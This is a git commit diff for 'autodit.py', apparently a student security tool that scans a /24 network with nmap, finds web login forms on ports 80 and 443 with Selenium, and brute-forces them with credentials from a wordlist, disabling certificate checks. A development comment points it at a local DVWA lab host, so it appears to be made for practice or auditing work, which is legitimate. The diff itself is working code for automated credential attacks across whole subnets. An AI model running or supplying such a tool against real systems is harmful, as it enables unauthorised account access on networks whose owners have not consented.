21d6b80b3478f17d60fa5387c8fe5abc1cf1e5b7
LoicBl0ndeau <loic.blondeau@student.junia.com>
2023-07-12 16:58:23 +0200

    Brute-force working

--- autodit.py
+++ autodit.py
@@ -8,6 +8,10 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
 import os #FOR DEV
+from colorama import just_fix_windows_console
+just_fix_windows_console()
+
+requests.packages.urllib3.disable_warnings()
 
 AsciiArt = """
       ___           ___                      ___                                             
@@ -30,6 +34,22 @@ AsciiArt = """
 """
 print(AsciiArt)
 
+class colors:
+    # Regular Colors
+    BLACK = '\033[0;30m'
+    RED = '\033[0;31m'
+    GREEN = '\033[0;32m'
+    YELLOW = '\033[0;33m'
+    BLUE = '\033[0;34m'
+    PURPLE = '\033[0;35m'
+    CYAN = '\033[0;36m'
+    WHITE = '\033[0;37m'
+    # Bold
+    BOLD = '\033[1m'
+    # Reset
+    RESET = '\033[0m'
+
+summary = []
 
 def scrapForm():
     # Removes SSL Issues With Chrome
@@ -39,14 +59,16 @@ def scrapForm():
     options.add_argument('--ignore-certificate-errors-spki-list')
     options.add_experimental_option("excludeSwitches", ["enable-logging"])
     options.add_argument('--disable-notifications')
-    #options.add_argument('--headless') # Comment to view browser actions
+    options.add_argument('--headless') # Comment to view browser actions
 
     driver = webdriver.Chrome(options=options)
     potential_input_password = []
     potential_input_username = []
+    potential_input_submit = []
     try:
         driver.get(url)
         WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'form input')))
+        redirected_url = driver.current_url
         inputs = driver.find_elements(By.CSS_SELECTOR, 'form input')
 
         for i in inputs: #get potential input 
@@ -54,29 +76,59 @@ def scrapForm():
             if str(i.get_attribute('disabled')).lower() != 'true' and str(i.value_of_css_property('display')).lower() != 'none' and str(i.get_attribute('name')).lower() != '':
                 if input_type == 'password':
                     potential_input_password.append(i)
+                elif input_type == 'submit':
+                    potential_input_submit.append(i)
                 elif any(x in input_type for x in ['text', 'email', 'number', 'tel', 'url', 'search']):
                     potential_input_username.append(i)
     except Exception:
-        print("[-] No form found on " + url)
+        print(colors.RED+"[-] No form found on " + url + colors.RESET)
     finally:
-        driver.quit()
-
-        if len(potential_input_password) != 1 or len(potential_input_username) > 1:
-            print("[-] Unable to brute-force on " + url)
+        if len(potential_input_password) != 1 or len(potential_input_username) > 1 or len(potential_input_submit) > 1:
+            print(colors.RED+"[-] Unable to brute-force on " + url + colors.RESET)
             webbrowser.open(url)
         else:
-            print(len(potential_input_password), len(potential_input_username))
-            #send(potential_input_username[0], potential_input_password[0])
+            potential_input_username = None if len(potential_input_username) == 0 else potential_input_username[0]
+            potential_input_submit = None if len(potential_input_submit) == 0 else potential_input_submit[0]
+            send(redirected_url, potential_input_username, potential_input_password[0], potential_input_submit)
+            driver.quit()
 
-def send(username, password):
-    payload = {'username': username, 'password': password}
-    r = requests.post(url, {'User-Agent': args.agent}, payload)
-    if "invalid" in r.text or "incorrect" in r.text:
-        print("[+] Correct logins: " + username+"/"+password+" on " + url)
+def send(redirected_url, input_username, input_password, input_submit):
+    with open("wordlist.txt", 'r') as f:
+        found = False
+        for logins in f.read().split("\n\n"):
+            username = logins.split("\n")[0]
+            password = logins.split("\n")[1]
+            if(input_username == None and input_submit == None):
+                payload = {input_password.get_attribute('name'): password}
+            elif(input_username == None):
+                payload = {input_password.get_attribute('name'): password, input_submit.get_attribute('name'): input_submit.get_attribute('value')}
+            elif(input_submit == None):
+                payload = {input_username.get_attribute('name'): username, input_password.get_attribute('name'): password}
+            else:
+                payload = {input_username.get_attribute('name'): username, input_password.get_attribute('name'): password, input_submit.get_attribute('name'): input_submit.get_attribute('value')}
+            session = requests.Session()
+            try:
+                r = session.post(redirected_url, headers={'User-Agent': args.agent}, data=payload, verify=False)
+                r = session.get(r.url, headers={'User-Agent': args.agent}, verify=False)
+                if r.url != redirected_url:
+                    if input_username == None:
+                        log = colors.BOLD + colors.GREEN + "[+] Login found on " + url + " : " + password + colors.RESET
+                    else:
+                        log = colors.BOLD + colors.GREEN + "[+] Login found on " + url + " : " + username + " / " + password + colors.RESET
+                    summary.append(log)
+                    print(log)
+                    found = True
+                    break
+            except:
+                print(colors.RED+"[-] Unable to send post request to " + redirected_url + colors.RESET)
+                webbrowser.open(redirected_url)
+                break
+        if not found:
+            print(colors.RED+"[-] No login found on " + url + colors.RESET)
 
 parser = argparse.ArgumentParser(description="Autodit by 123CS")
 parser.add_argument('--ip', help="IP class to scan (searching in /24)", required=True)
-parser.add_argument('--agent', help="User agent string to send the login as. Default : Agent:Mozilla/5.0", default="Agent:Mozilla/5.0", required=False)
+parser.add_argument('--agent', help="User agent string to send the login as. Default : Agent:Mozilla/5.0", default="Mozilla/5.0", required=False)
 parser.add_argument('--wordlist', help="Name of the wordlist file to use. It must be in the format : login1 \\n password1 \\n\\n login2 \\n password2", default="wordlist.txt", required=False)
 args = parser.parse_args()
 
@@ -91,6 +143,7 @@ if not os.path.exists(args.ip+"-24.g"): #FOR DEV
         print("An error occurred:", error.decode("utf-8"))
         exit(1)
 
+    print(colors.BOLD + colors.GREEN + "[+] Scan done and saved as "+args.ip+"-24.xml" + colors.RESET)
     res_nmap = output.decode("utf-8")
 else: #FOR DEV
     with open(args.ip+"-24.g", 'r') as f: #FOR DEV
@@ -102,15 +155,21 @@ print("[*] Wordlist: " + args.wordlist)
 for line in res_nmap.split('\n'):
     if "80/open" in line or "443/open" in line:
         ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line).group()
-        if "https" in line:
-            url = "https://"+ip_match
-        else:
+        if ip_match == "192.168.152.130": #FOR DEV
+            ip_match = ip_match+"/dvwa/" #FOR DEV
+        if "80/open" in line:
             url = "http://"+ip_match
+        else:
+            url = "https://"+ip_match
         #webbrowser.open(url)
 
         print("[*] URL: " + url)
         scrapForm()
-        with open("wordlist.txt", 'r') as f:
-            for logins in f.read().split("\n\n"):
-                username = logins.split("\n")[0]
-                password = logins.split("\n")[1]
+
+print("\n\n[*] Summary:")
+if len(summary) == 0:
+    print("No login found")
+else:
+    for log in summary:
+        print(log)
+print("\n")
